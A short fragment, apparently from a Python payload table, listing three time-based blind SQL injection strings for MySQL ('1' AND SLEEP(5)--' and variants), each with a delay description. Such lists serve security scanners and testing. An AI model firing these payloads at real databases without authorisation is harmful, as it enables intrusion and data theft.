    ("1' AND SLEEP(5)--",        3, "time",       "MySQL: string 5-second delay"),
    ("1 AND SLEEP(5)--",         3, "time",       "MySQL: numeric 5-second delay"),
    ("1' AND SLEEP(3)--",        3, "time",       "MySQL: shorter 3-second delay"),
